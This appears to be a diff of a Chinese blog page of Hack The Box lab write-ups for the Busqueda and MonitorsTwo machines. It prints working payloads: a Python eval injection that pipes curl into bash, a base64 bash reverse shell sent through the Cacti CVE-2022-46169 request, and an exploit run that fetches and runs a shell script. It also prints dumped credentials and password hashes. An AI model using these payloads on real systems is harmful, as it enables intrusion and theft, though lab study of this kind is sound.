@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">5.7k</span>
+            <span class="post-count">10.4k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">30 分钟</span>
+            <span class="post-count">57 分钟</span>
         </span>
     </span>
 </div>
@@ -120,6 +120,7 @@
     <div class="article-entry" itemprop="articleBody">
        
   <p>下载htb的openvpn文件后，openvpn 文件</p>
+<p>目的是获取user.txt和root.txt</p>
 <h1 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h1><h2 id="1-Busqueda-linux提权"><a href="#1-Busqueda-linux提权" class="headerlink" title="1.Busqueda(linux提权)"></a>1.Busqueda(linux提权)</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_56308852/article/details/130168742?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-5-130168742-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">htb busqueda wp要点记录_春猿火的博客-CSDN博客</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_58869808/article/details/130050438?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-130050438-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">(87条消息) HTB Busqueda WriteUP_Som3B0dy的博客-CSDN博客</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1LV4y1Z7Wp/?spm_id_from=333.337.search-card.all.click">Hack The Box 赛季活动靶场【Busqueda】User &amp; System Flag攻略_哔哩哔哩_bilibili</a></p>
@@ -182,7 +183,7 @@
 <p><code>query=http%3a//127.0.0.1/debug&#39;%2beval(compile(&#39;for+x+in+range(1)%3a\n+import+os\n+os.system(&quot;curl+http%3a//10.10.14.89/shell|bash&quot;)&#39;,&#39;a&#39;,&#39;single&#39;))%2b&#39;</code></p>
 <p>(不明觉厉o(￣▽￣)ｄ )</p>
 <p>。。。然后捏，我没监听到东西。</p>
-<p>好吧，<strong>是因为kali有防火墙</strong></p>
+<p>可能<strong>是因为kali有防火墙</strong></p>
 <p><code>sudo systemctl stop ufw</code></p>
 <p><code>sudo systemctl disable ufw</code></p>
 <p>将防火墙禁用，重新发包即可。</p>
@@ -219,7 +220,7 @@
 <p>尝试下cody后的东西作为密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:~$ echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">[sudo] password for svc: Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>jh1usoih2bkjaspwe92确实是密码。账号为<a href="mailto:&#x73;&#x76;&#x63;&#64;&#49;&#48;&#46;&#49;&#x30;&#46;&#x31;&#x31;&#x2e;&#50;&#x30;&#x38;">&#x73;&#x76;&#x63;&#64;&#49;&#48;&#46;&#49;&#x30;&#46;&#x31;&#x31;&#x2e;&#50;&#x30;&#x38;</a>，ssh连接即可。</p>
+<p>jh1usoih2bkjaspwe92确实是密码。账号为<a href="mailto:&#x73;&#118;&#99;&#64;&#x31;&#48;&#46;&#49;&#x30;&#x2e;&#x31;&#49;&#46;&#x32;&#48;&#56;">&#x73;&#118;&#99;&#64;&#x31;&#48;&#46;&#49;&#x30;&#x2e;&#x31;&#49;&#46;&#x32;&#48;&#56;</a>，ssh连接即可。</p>
 <h3 id="svc-gt-root"><a href="#svc-gt-root" class="headerlink" title="svc-&gt;root"></a>svc-&gt;root</h3><p>登录进来后</p>
 <p><code>sudo -l</code> 为了看看当前用户可执行的命令</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -240,7 +241,7 @@
 
 <p>打开浏览器输入<a target="_blank" rel="noopener" href="http://gitea.searcher.htb/">http://gitea.searcher.htb</a></p>
 <p>点击右上角sign in 出现</p>
-<p><img src="/../../../Typora/img111/image-20230606214158201.png" alt="image-20230606214158201"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230606214158201.png"></p>
 <p>先放一遍。</p>
 <p>再次在svc用户界面下，</p>
 <p>sudo -l，</p>
@@ -281,11 +282,11 @@
 <p>“MYSQL_ROOT_PASSWORD&#x3D;jI86kGUuj87guWr3RyF”,”MYSQL_USER&#x3D;gitea”,”MYSQL_PASSWORD&#x3D;yuiu1hoiu4i5ho1uh”,”MYSQL_DATABASE&#x3D;gitea”</p>
 </blockquote>
 <p>好，进入gitea的登录页面，尝试administrator:yuiu1hoiu4i5ho1uh</p>
-<p><img src="/../../../Typora/img111/image-20230607201649485.png" alt="image-20230607201649485"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230607201649485.png"></p>
 <p>点击左边的仓库，发现：</p>
-<p><img src="/../../../Typora/img111/image-20230607201740407.png" alt="image-20230607201740407"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230607201740407.png"></p>
 <p>查看第一行脚本：</p>
-<p><img src="/../../../Typora/img111/image-20230607201759588.png" alt="image-20230607201759588"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230607201759588.png"></p>
 <p>前三个脚本对应了，之前的三个命令。</p>
 <p>查看第四个脚本内容，</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">import subprocess</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">actions = [&#x27;full-checkup&#x27;, &#x27;docker-ps&#x27;,&#x27;docker-inspect&#x27;]</span><br><span class="line"></span><br><span class="line">def run_command(arg_list):</span><br><span class="line">    r = subprocess.run(arg_list, capture_output=True)</span><br><span class="line">    if r.stderr:</span><br><span class="line">        output = r.stderr.decode()</span><br><span class="line">    else:</span><br><span class="line">        output = r.stdout.decode()</span><br><span class="line"></span><br><span class="line">    return output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_action(action):</span><br><span class="line">    if action == &#x27;docker-inspect&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            _format = sys.argv[2]</span><br><span class="line">            if len(_format) == 0:</span><br><span class="line">                print(f&quot;Format can&#x27;t be empty&quot;)</span><br><span class="line">                exit(1)</span><br><span class="line">            container = sys.argv[3]</span><br><span class="line">            arg_list = [&#x27;docker&#x27;, &#x27;inspect&#x27;, &#x27;--format&#x27;, _format, container]</span><br><span class="line">            print(run_command(arg_list)) </span><br></pre></td></tr></table></figure>
@@ -358,17 +359,263 @@
 
 
 <p>发现域名sequel.htb与子域名dc.sequel.htb</p>
-<h2 id="3-MonitorsTwo"><a href="#3-MonitorsTwo" class="headerlink" title="3.MonitorsTwo"></a>3.MonitorsTwo</h2><p><code>nmap -Pn 10.10.11.211 </code></p>
+<h2 id="3-MonitorsTwo-版本漏洞"><a href="#3-MonitorsTwo-版本漏洞" class="headerlink" title="3.MonitorsTwo(版本漏洞)"></a>3.MonitorsTwo(版本漏洞)</h2><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64201116/article/details/130957041?ops_request_misc=%7B%22request_id%22:%22168749798516800211583630%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168749798516800211583630&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-3-130957041-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=MonitorsTwo&spm=1018.2226.3001.4187">HTB MonitorsTwo_清风–的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43264813/article/details/130860974?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_utm_term~default-0-130860974-blog-130957041.235%5Ev38%5Epc_relevant_sort_base3&spm=1001.2101.3001.4242.1&utm_relevant_index=3">HackTheBox系列-MonitorsTwo_夜白君的博客-CSDN博客</a></p>
+<h3 id="1-扫描端口"><a href="#1-扫描端口" class="headerlink" title="1.扫描端口"></a>1.扫描端口</h3><p><code>nmap -Pn 10.10.11.211 </code></p>
 <blockquote>
 <p>22和80</p>
 </blockquote>
 <p>访问</p>
-<p><img src="/../../../Typora/img111/image-20230621162319430.png"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230621162319430.png"></p>
+<p>这是一个Cacti的框架 Version 1.2.22 | (c) 2004-2023 - The Cacti Group</p>
 <p>抓个包</p>
 <blockquote>
 <p>POST &#x2F;index.php HTTP&#x2F;1.1<br>Host: 10.10.11.211<br>User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:102.0) Gecko&#x2F;20100101 Firefox&#x2F;102.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: en-US,en;q&#x3D;0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 143<br>Origin: <a target="_blank" rel="noopener" href="http://10.10.11.211/">http://10.10.11.211</a><br>Connection: close<br>Referer: <a target="_blank" rel="noopener" href="http://10.10.11.211/index.php">http://10.10.11.211/index.php</a><br>Cookie: Cacti&#x3D;23c13c8cedf59e7ab5692967d58edba1; CactiDateTime&#x3D;Wed Jun 21 2023 16:26:22 GMT+0800 (China Standard Time); CactiTimeZone&#x3D;480<br>Upgrade-Insecure-Requests: 1</p>
 <p>__csrf_magic&#x3D;sid%3A85cdbc25916003d0deb870cb3312ad1f4dbe3b51%2C1687335980&amp;action&#x3D;login&amp;login_username&#x3D;admin123&amp;login_password&#x3D;123&amp;remember_me&#x3D;on</p>
 </blockquote>
+<p>没看出来。</p>
+<p>dirb扫描路径</p>
+<blockquote>
+<p>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/cache/">http://10.10.11.211/cache/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/docs/">http://10.10.11.211/docs/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/images/">http://10.10.11.211/images/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/include/">http://10.10.11.211/include/</a>                                                                 </p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://10.10.11.211/index.php">http://10.10.11.211/index.php</a> (CODE:200|SIZE:13844)<br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/install/">http://10.10.11.211/install/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/lib/">http://10.10.11.211/lib/</a>                                                                     </li>
+<li><a target="_blank" rel="noopener" href="http://10.10.11.211/LICENSE">http://10.10.11.211/LICENSE</a> (CODE:200|SIZE:15171)                                                         </li>
+<li><a target="_blank" rel="noopener" href="http://10.10.11.211/log">http://10.10.11.211/log</a> (CODE:403|SIZE:276)<br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/plugins/">http://10.10.11.211/plugins/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/resource/">http://10.10.11.211/resource/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/scripts/">http://10.10.11.211/scripts/</a>                                                                 </li>
+<li><a target="_blank" rel="noopener" href="http://10.10.11.211/server-status">http://10.10.11.211/server-status</a> (CODE:403|SIZE:276)<br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/service/">http://10.10.11.211/service/</a></li>
+</ul>
+<p>—- Entering directory: <a target="_blank" rel="noopener" href="http://10.10.11.211/cache/">http://10.10.11.211/cache/</a> —-</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://10.10.11.211/cache/index.php">http://10.10.11.211/cache/index.php</a> (CODE:302|SIZE:0)</li>
+</ul>
+</blockquote>
+<p>没什么用</p>
+<h3 id="2-版本漏洞"><a href="#2-版本漏洞" class="headerlink" title="2.版本漏洞"></a>2.版本漏洞</h3><p>回过头看看版本信息Version 1.2.22 | (c) 2004-2023 - The Cacti Group</p>
+<p>谷歌一下</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230621201847673.png"></p>
+<p>命令注入漏洞 (CVE-2022-46169)<a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/">https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/</a></p>
+<p>以下有两种做法，做法1，我的没实现成功；成功的是做法2。</p>
+<h4 id="做法1："><a href="#做法1：" class="headerlink" title="做法1："></a>做法1：</h4><p>GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;<code>bash+-c+&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Ni8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</code><br><code>bash -i &gt;&amp; /dev/tcp/10.10.14.96/1234 0&gt;&amp;1 //这个是攻击机的地址</code></p>
+<blockquote>
+<p>base64后：</p>
+<p>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Ni8xMjM0IDA+JjE&#x3D;</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Dk4y1E7kf/">Hack The Box 赛季活动靶场【MonitorsTwo】User&amp;System Flag攻略_哔哩哔哩_bilibili</a></p>
+<p>构造这个</p>
+<blockquote>
+<p><strong>GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;`bash+-c+”{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Ni8xMjM0IDA+JjE&#x3D;}|{base64,-d}|{bash,-i}”&#96; HTTP&#x2F;1.1</strong><br><strong>X-Forwarded-For: 127.0.0.1</strong><br>Host: 10.10.11.211<br>User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:102.0) Gecko&#x2F;20100101 Firefox&#x2F;102.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: en-US,en;q&#x3D;0.5<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: CactiDateTime&#x3D;Wed Jun 21 2023 22:26:48 GMT+0800 (China Standard Time); CactiTimeZone&#x3D;480; Cacti&#x3D;662c23c759cac6c538f02c2d2cb02919<br>Upgrade-Insecure-Requests: 1</p>
+</blockquote>
+<p>repeater发送之前，nc监听</p>
+<p>nc -lvnp 1234，但是，没反应。</p>
+<h4 id="做法2："><a href="#做法2：" class="headerlink" title="做法2："></a>做法2：</h4><p>换一条路。</p>
+<p>下载以下地址的py文件。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sAsPeCt488/CVE-2022-46169/blob/main/CVE-2022-46169.py">CVE-2022-46169&#x2F;CVE-2022-46169.py at main · sAsPeCt488&#x2F;CVE-2022-46169 (github.com)</a></p>
+<blockquote>
+<p>┌──(root㉿kali)-[~]<br>└─# vim 1234.sh</p>
+<p>┌──(root㉿kali)-[~]<br>└─# cat 1234.sh<br>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.96&#x2F;1234 0&gt;&amp;1</p>
+</blockquote>
+<p>python3 CVE-2022-46169.py <a target="_blank" rel="noopener" href="http://10.10.11.211/">http://10.10.11.211</a> -c “curl 10.10.14.96&#x2F;1234.sh|bash</p>
+<blockquote>
+<p>┌──(root㉿kali)-[~]<br>└─# python3 CVE-2022-46169.py <a target="_blank" rel="noopener" href="http://10.10.11.211/">http://10.10.11.211</a> -c “curl <a target="_blank" rel="noopener" href="http://10.10.14.96/">http://10.10.14.96</a>“<br>[*] Trying for 1 - 100 host ids<br>[+] Exploit Completed for host_id &#x3D; 1</p>
+</blockquote>
+<blockquote>
+<p>┌──(root㉿kali)-[~]<br>└─# python -m http.server 80 </p>
+<p>10.10.11.211 - - [21&#x2F;Jun&#x2F;2023 23:49:57] “GET &#x2F; HTTP&#x2F;1.1” 200 -</p>
+</blockquote>
+<blockquote>
+<p>新开窗口，nc -lvnp 1234</p>
+</blockquote>
+<blockquote>
+<p>┌──(root㉿kali)-[~]<br>└─# python3 CVE-2022-46169.py <a target="_blank" rel="noopener" href="http://10.10.11.211/">http://10.10.11.211</a> -c “curl <a target="_blank" rel="noopener" href="http://10.10.14.96/1234.sh">http://10.10.14.96/1234.sh</a> | <strong>&#x2F;bin&#x2F;bash</strong>“<br>[*] Trying for 1 - 100 host ids</p>
+</blockquote>
+<p>查看监听窗口</p>
+<blockquote>
+<p>┌──(root㉿kali)-[~]<br>└─# nc -lvnp 1234<br>listening on [any] 1234 …<br>connect to [10.10.14.96] from (UNKNOWN) [10.10.11.211] 54714<br>bash: cannot set terminal process group (1): Inappropriate ioctl for device<br>bash: no job control in this shell<br>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html$ </p>
+</blockquote>
+<blockquote>
+<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html$ ls -a<br>ls -a<br>.<br>..<br>.mdl_style.rb<br>.mdlrc<br>.rnd<br>CHANGELOG<br>LICENSE<br>README.md<br>about.php<br>aggregate_graphs.php<br>aggregate_items.php<br>aggregate_templates.php<br>auth_changepassword.php<br>auth_login.php<br>auth_profile.php<br>automation_devices.php<br>automation_graph_rules.php<br>automation_networks.php<br>automation_snmp.php<br>automation_templates.php<br>automation_tree_rules.php<br>boost_rrdupdate.php<br>cache<br>cacti.sql<br>cactid.php<br>cdef.php<br>cli<br>clog.php<br>clog_user.php<br>cmd.php<br>cmd_realtime.php<br>color.php<br>color_templates.php<br>color_templates_items.php<br>data_debug.php<br>data_input.php<br>data_queries.php<br>data_source_profiles.php<br>data_sources.php<br>data_templates.php<br>docs<br>formats<br>gprint_presets.php<br>graph.php<br>graph_image.php<br>graph_json.php<br>graph_realtime.php<br>graph_templates.php<br>graph_templates_inputs.php<br>graph_templates_items.php<br>graph_view.php<br>graph_xport.php<br>graphs.php<br>graphs_items.php<br>graphs_new.php<br>help.php<br>host.php<br>host_templates.php<br>images<br>include<br>index.php<br>install<br>lib<br>link.php<br>links.php<br>locales<br>log<br>logout.php<br>managers.php<br>mibs<br>permission_denied.php<br>plugins<br>plugins.php<br>poller.php<br>poller_automation.php<br>poller_boost.php<br>poller_commands.php<br>poller_dsstats.php<br>poller_maintenance.php<br>poller_realtime.php<br>poller_recovery.php<br>poller_reports.php<br>poller_spikekill.php<br>pollers.php<br>remote_agent.php<br>reports_admin.php<br>reports_user.php<br>resource<br>rra<br>rrdcleaner.php<br>script_server.php<br>scripts<br>service<br>service_check.php<br>settings.php<br>sites.php<br>snmpagent_mibcache.php<br>snmpagent_mibcachechild.php<br>snmpagent_persist.php<br>spikekill.php<br>templates_export.php<br>templates_import.php<br>tree.php<br>user_admin.php<br>user_domains.php<br>user_group_admin.php<br>utilities.php<br>vdef.php</p>
+</blockquote>
+<blockquote>
+<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html$ cd include<br>cd include<br>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ ls<br>ls<br>auth.php<br>bottom_footer.php<br>cacti_version<br>cli_check.php<br>config.php<br>content<br>csrf.php<br>fa<br>fonts<br>global.php<br>global_arrays.php<br>global_constants.php<br>global_form.php<br>global_languages.php<br>global_session.php<br>global_settings.php<br>index.php<br>js<br>layout.js<br>plugins.php<br>realtime.js<br>session.php<br>themes<br>top_general_header.php<br>top_graph_header.php<br>top_header.php<br>vendor</p>
+</blockquote>
+<blockquote>
+<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ cat config.php<br>cat config.php<br>&lt;?php<br>&#x2F;*<br> +————————————————————————-+<br> | Copyright (C) 2004-2020 The Cacti Group                                 |<br> |                                                                         |<br> | This program is free software; you can redistribute it and&#x2F;or           |<br> | modify it under the terms of the GNU General Public License             |<br> | as published by the Free Software Foundation; either version 2          |<br> | of the License, or (at your option) any later version.                  |<br> |                                                                         |<br> | This program is distributed in the hope that it will be useful,         |<br> | but WITHOUT ANY WARRANTY; without even the implied warranty of          |<br> | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           |<br> | GNU General Public License for more details.                            |<br> +————————————————————————-+<br> | Cacti: The Complete RRDtool-based Graphing Solution                     |<br> +————————————————————————-+<br> | This code is designed, written, and maintained by the Cacti Group. See  |<br> | about.php and&#x2F;or the AUTHORS file for specific developer information.   |<br> +————————————————————————-+<br> | <a target="_blank" rel="noopener" href="http://www.cacti.net/">http://www.cacti.net/</a>                                                   |<br> +————————————————————————-+<br>*&#x2F;</p>
+<p>&#x2F;*</p>
+<ul>
+<li>Make sure these values reflect your actual database&#x2F;host&#x2F;user&#x2F;password<br> *&#x2F;</li>
+</ul>
+<p>$database_type     &#x3D; ‘mysql’;<br>$database_default  &#x3D; ‘cacti’;<br>$database_hostname &#x3D; ‘db’;<br>$database_username &#x3D; ‘root’;<br>$database_password &#x3D; ‘root’;<br>$database_port     &#x3D; ‘3306’;<br>$database_retries  &#x3D; 5;<br>$database_ssl      &#x3D; false;<br>$database_ssl_key  &#x3D; ‘’;<br>$database_ssl_cert &#x3D; ‘’;<br>$database_ssl_ca   &#x3D; ‘’;<br>$database_persist  &#x3D; false;</p>
+</blockquote>
+<blockquote>
+<p>define(‘DEBUG_SQL_FLOW’, true);www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ <strong>mysql –host&#x3D;db –user&#x3D;root –password&#x3D;root -e “show databases;”</strong></p>
+<p>&lt;db –user&#x3D;root –password&#x3D;root -e “show databases;”<br>Database<br>information_schema<br>cacti<br>mysql<br>performance_schema<br>sys</p>
+</blockquote>
+<blockquote>
+<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ <strong>mysql –host&#x3D;db –user&#x3D;root –password&#x3D;root cacti -e “show tables;”</strong><br>&lt;–user&#x3D;root –password&#x3D;root cacti -e “show tables;”<br>Tables_in_cacti<br>aggregate_graph_templates<br>aggregate_graph_templates_graph<br>aggregate_graph_templates_item<br>aggregate_graphs<br>aggregate_graphs_graph_item<br>aggregate_graphs_items<br>automation_devices<br>automation_graph_rule_items<br>automation_graph_rules<br>automation_ips<br>automation_match_rule_items<br>automation_networks<br>automation_processes<br>automation_snmp<br>automation_snmp_items<br>automation_templates<br>automation_tree_rule_items<br>automation_tree_rules<br>cdef<br>cdef_items<br>color_template_items<br>color_templates<br>colors<br>data_debug<br>data_input<br>data_input_data<br>data_input_fields<br>data_local<br>data_source_profiles<br>data_source_profiles_cf<br>data_source_profiles_rra<br>data_source_purge_action<br>data_source_purge_temp<br>data_source_stats_daily<br>data_source_stats_hourly<br>data_source_stats_hourly_cache<br>data_source_stats_hourly_last<br>data_source_stats_monthly<br>data_source_stats_weekly<br>data_source_stats_yearly<br>data_template<br>data_template_data<br>data_template_rrd<br>external_links<br>graph_local<br>graph_template_input<br>graph_template_input_defs<br>graph_templates<br>graph_templates_gprint<br>graph_templates_graph<br>graph_templates_item<br>graph_tree<br>graph_tree_items<br>host<br>host_graph<br>host_snmp_cache<br>host_snmp_query<br>host_template<br>host_template_graph<br>host_template_snmp_query<br>plugin_config<br>plugin_db_changes<br>plugin_hooks<br>plugin_realms<br>poller<br>poller_command<br>poller_data_template_field_mappings<br>poller_item<br>poller_output<br>poller_output_boost<br>poller_output_boost_local_data_ids<br>poller_output_boost_processes<br>poller_output_realtime<br>poller_reindex<br>poller_resource_cache<br>poller_time<br>processes<br>reports<br>reports_items<br>sessions<br>settings<br>settings_tree<br>settings_user<br>settings_user_group<br>sites<br>snmp_query<br>snmp_query_graph<br>snmp_query_graph_rrd<br>snmp_query_graph_rrd_sv<br>snmp_query_graph_sv<br>snmpagent_cache<br>snmpagent_cache_notifications<br>snmpagent_cache_textual_conventions<br>snmpagent_managers<br>snmpagent_managers_notifications<br>snmpagent_mibs<br>snmpagent_notifications_log<br><strong>user_auth</strong><br>user_auth_cache<br>user_auth_group<br>user_auth_group_members<br>user_auth_group_perms<br>user_auth_group_realm<br>user_auth_perms<br>user_auth_realm<br>user_domains<br>user_domains_ldap<br>user_log<br>vdef<br>vdef_items<br>version</p>
+</blockquote>
+<blockquote>
+<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ <strong>mysql –host&#x3D;db –user&#x3D;root –password&#x3D;root cacti -e “select * from user_auth;”</strong></p>
+</blockquote>
+<blockquote>
+<p>&lt;–password&#x3D;root cacti -e “select * from user_auth;”<br>id      username        password        realm   full_name       email_address   must_change_password    password_change      show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphspolicy_trees    policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history     locked  failed_attempts lastfail        reset_perms<br>1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ&#x2F;iuqMft&#x2F;llx8utpR1hjC    0       Jamie Thompson  <a href="mailto:&#97;&#x64;&#x6d;&#x69;&#x6e;&#64;&#109;&#x6f;&#110;&#x69;&#116;&#111;&#114;&#115;&#116;&#x77;&#111;&#46;&#x68;&#116;&#98;">&#97;&#x64;&#x6d;&#x69;&#x6e;&#64;&#109;&#x6f;&#110;&#x69;&#116;&#111;&#114;&#115;&#116;&#x77;&#111;&#46;&#x68;&#116;&#98;</a>                on      on      on      on      on      2       1       1       1       1   on       -1      -1      -1              0       0       663348655<br>3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on  31       1       1       1       1               -1      -1      -1              0       0       0<br>4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW&#x2F;MhFYK4C    0       Marcus Brune    <a href="mailto:&#109;&#97;&#114;&#x63;&#x75;&#115;&#64;&#x6d;&#111;&#x6e;&#x69;&#116;&#x6f;&#114;&#115;&#116;&#119;&#111;&#x2e;&#x68;&#x74;&#98;">&#109;&#97;&#114;&#x63;&#x75;&#115;&#64;&#x6d;&#111;&#x6e;&#x69;&#116;&#x6f;&#114;&#115;&#116;&#119;&#111;&#x2e;&#x68;&#x74;&#98;</a>                       on      on      on      on      1       1       1       1       1   on       -1      -1              on      0       0       2135691668</p>
+</blockquote>
